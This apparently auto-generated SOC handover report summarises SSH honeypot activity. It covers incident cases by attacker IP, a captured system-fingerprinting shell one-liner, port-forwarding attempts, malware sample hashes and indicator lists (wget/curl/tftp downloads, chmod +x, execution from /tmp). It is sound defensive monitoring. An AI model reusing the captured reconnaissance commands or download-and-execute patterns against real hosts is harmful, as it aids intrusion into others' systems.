| **First Seen** | 2026-08-13 12:49 |
| **Last Seen** | 2026-08-13 12:49 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 12:49:42` | `cowrie.session.connect` |
| `2026-08-13 12:49:43` | `cowrie.client.version` |
| `2026-08-13 12:49:43` | `cowrie.client.kex` |
| `2026-08-13 12:49:46` | `cowrie.login.success` |
| `2026-08-13 12:49:48` | `cowrie.session.params` |
| `2026-08-13 12:49:48` | `cowrie.command.input` |
| `2026-08-13 12:49:48` | `cowrie.command.input` |
| `2026-08-13 12:49:48` | `cowrie.command.input` |
| `2026-08-13 12:49:48` | `cowrie.command.input` |
| `2026-08-13 12:49:48` | `cowrie.command.input` |
| `2026-08-13 12:49:48` | `cowrie.command.success` |
| `2026-08-13 12:49:48` | `cowrie.command.input` |
| `2026-08-13 12:49:48` | `cowrie.command.input` |
| `2026-08-13 12:49:48` | `cowrie.command.input` |
| `2026-08-13 12:49:48` | `cowrie.command.input` |
| `2026-08-13 12:49:48` | `cowrie.log.closed` |
| `2026-08-13 12:49:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a120924d736

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-13 12:52 |
| **Last Seen** | 2026-08-13 12:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 12:52:02` | `cowrie.session.connect` |
| `2026-08-13 12:52:03` | `cowrie.client.version` |
| `2026-08-13 12:52:03` | `cowrie.client.kex` |
| `2026-08-13 12:52:06` | `cowrie.login.success` |
| `2026-08-13 12:52:09` | `cowrie.session.params` |
| `2026-08-13 12:52:09` | `cowrie.command.input` |
| `2026-08-13 12:52:09` | `cowrie.command.input` |
| `2026-08-13 12:52:09` | `cowrie.command.input` |
| `2026-08-13 12:52:09` | `cowrie.command.input` |
| `2026-08-13 12:52:09` | `cowrie.command.input` |
| `2026-08-13 12:52:09` | `cowrie.command.success` |
| `2026-08-13 12:52:09` | `cowrie.command.input` |
| `2026-08-13 12:52:09` | `cowrie.command.input` |
| `2026-08-13 12:52:09` | `cowrie.command.input` |
| `2026-08-13 12:52:09` | `cowrie.command.input` |
| `2026-08-13 12:52:09` | `cowrie.log.closed` |
| `2026-08-13 12:52:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abcf726fd15b

| Field | Detail |
|---|---|
| **Source IP** | `60.223.250[.]50` |
| **First Seen** | 2026-08-13 12:52 |
| **Last Seen** | 2026-08-13 12:53 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 12:52:55` | `cowrie.session.connect` |
| `2026-08-13 12:52:56` | `cowrie.client.version` |
| `2026-08-13 12:52:56` | `cowrie.client.kex` |
| `2026-08-13 12:52:59` | `cowrie.login.success` |
| `2026-08-13 12:53:01` | `cowrie.direct-tcpip.request` |
| `2026-08-13 12:53:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.223.250[.]50` to AbuseIPDB if not already reported
- [ ] Block `60.223.250[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b864aa6aa7a4

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]248` |
| **First Seen** | 2026-08-13 12:53 |
| **Last Seen** | 2026-08-13 12:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 12:53:06` | `cowrie.session.connect` |
| `2026-08-13 12:53:07` | `cowrie.client.version` |
| `2026-08-13 12:53:07` | `cowrie.client.kex` |
| `2026-08-13 12:53:09` | `cowrie.login.success` |
| `2026-08-13 12:53:09` | `cowrie.direct-tcpip.request` |
| `2026-08-13 12:53:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]248` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]248` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f9656028297

| Field | Detail |
|---|---|
| **Source IP** | `111.53.131[.]79` |
| **First Seen** | 2026-08-13 12:54 |
| **Last Seen** | 2026-08-13 12:54 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 12:54:50` | `cowrie.session.connect` |
| `2026-08-13 12:54:51` | `cowrie.client.version` |
| `2026-08-13 12:54:51` | `cowrie.client.kex` |
| `2026-08-13 12:54:54` | `cowrie.login.success` |
| `2026-08-13 12:54:54` | `cowrie.direct-tcpip.request` |
| `2026-08-13 12:54:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.53.131[.]79` to AbuseIPDB if not already reported
- [ ] Block `111.53.131[.]79` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `210.16.100[.]120` | **14** | 2026-08-13 11:00 | 2026-08-13 12:43 | 14m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **5** | 2026-08-13 10:59 | 2026-08-13 12:47 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]121` | **4** | 2026-08-13 11:00 | 2026-08-13 11:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `123.56.11[.]51` | **3** | 2026-08-13 11:19 | 2026-08-13 11:23 | 6m | 0 | `T1592` | 🟢 LOW |
| `45.227.254[.]154` | **3** | 2026-08-13 11:24 | 2026-08-13 11:24 | 0m | 0 | `T1592` | 🟢 LOW |
| `104.238.110[.]208` | **2** | 2026-08-13 11:35 | 2026-08-13 12:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `107.150.146[.]69` | **2** | 2026-08-13 11:31 | 2026-08-13 12:07 | 1m | 0 | `T1592` | 🟢 LOW |
| `124.122.115[.]154` | **2** | 2026-08-13 11:46 | 2026-08-13 11:46 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | **2** | 2026-08-13 11:54 | 2026-08-13 12:51 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `18.218.118[.]203` | **2** | 2026-08-13 12:47 | 2026-08-13 12:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.64.105[.]236` | **2** | 2026-08-13 11:39 | 2026-08-13 11:39 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.79.181[.]179` | **2** | 2026-08-13 12:37 | 2026-08-13 12:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]40` | **2** | 2026-08-13 12:37 | 2026-08-13 12:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]55` | **2** | 2026-08-13 11:57 | 2026-08-13 12:14 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `143.0.71[.]185` | 1 | 2026-08-13 11:01 | 2026-08-13 11:01 | 10s | 0 | `T1592` | 🟢 LOW |
| `153.37.177[.]219` | 1 | 2026-08-13 12:36 | 2026-08-13 12:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `173.255.221[.]189` | 1 | 2026-08-13 12:36 | 2026-08-13 12:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `176.32.193[.]16` | 1 | 2026-08-13 11:00 | 2026-08-13 11:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `178.38.203[.]75` | 1 | 2026-08-13 10:56 | 2026-08-13 10:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `186.4.95[.]17` | 1 | 2026-08-13 12:39 | 2026-08-13 12:39 | 10s | 0 | `T1592` | 🟢 LOW |
| `218.94.115[.]164` | 1 | 2026-08-13 10:57 | 2026-08-13 10:57 | 2s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]181` | 1 | 2026-08-13 11:38 | 2026-08-13 11:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.211[.]97` | 1 | 2026-08-13 12:36 | 2026-08-13 12:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.210.94[.]61` | 1 | 2026-08-13 11:04 | 2026-08-13 11:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `49.124.151[.]58` | 1 | 2026-08-13 12:15 | 2026-08-13 12:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `61.184.128[.]210` | 1 | 2026-08-13 12:12 | 2026-08-13 12:14 | 120s | 0 | `T1592` | 🟢 LOW |
| `61.240.17[.]66` | 1 | 2026-08-13 11:22 | 2026-08-13 11:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `81.236.211[.]54` | 1 | 2026-08-13 11:09 | 2026-08-13 11:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]21` | 1 | 2026-08-13 11:53 | 2026-08-13 11:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | 1 | 2026-08-13 11:21 | 2026-08-13 11:22 | 50s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 84/100 | 🔴 HIGH | **35/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 41/100 | 🟡 MEDIUM | **29/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **23/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **25/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 47/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `122.170.97[.]94` | IN | ABTS-MUMBAI | **100** ⚠️ | 50 |
| `173.255.221[.]189` | US | Linode | **100** ⚠️ | 50 |
| `81.236.211[.]54` | SE | Telia Network Services | **100** ⚠️ | 50 |
| `111.70.32[.]51` | TW | CHT-Mobile business Group,Chunghwa | **100** ⚠️ | 50 |
| `178.38.203[.]75` | CH | Sunrise GmbH | **100** ⚠️ | 2 |
| `186.4.95[.]17` | AR | RSO APOLO HIDALGO S.R.L. | **100** ⚠️ | 2 |
| `20.64.105[.]236` | US | Microsoft Corporation | **100** ⚠️ | 50 |
| `195.222.57[.]183` | BA | Public Enterprise BH Telecom DD | **100** ⚠️ | 50 |
| `124.122.115[.]154` | TH | True Internet Co., Ltd. | **100** ⚠️ | 2 |
| `210.16.100[.]120` | US | Psychz Networks | **100** ⚠️ | 6 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 67 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 53 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 18 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 18 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 18 |

---

## 🔕 False Positive Summary (25 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 13 |
| AbuseIPDB score 15 below threshold 25 | 3 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 8 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 141 cases |
| Tool 34  | Credential Extractor        | ✅ 67 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 12 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 70 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 25 filtered (17.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 57 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 21 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 53 priority case(s) shown individually · 30 recon entry/entries in table (14 group(s) consolidating 47 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-13T13:20:59Z_
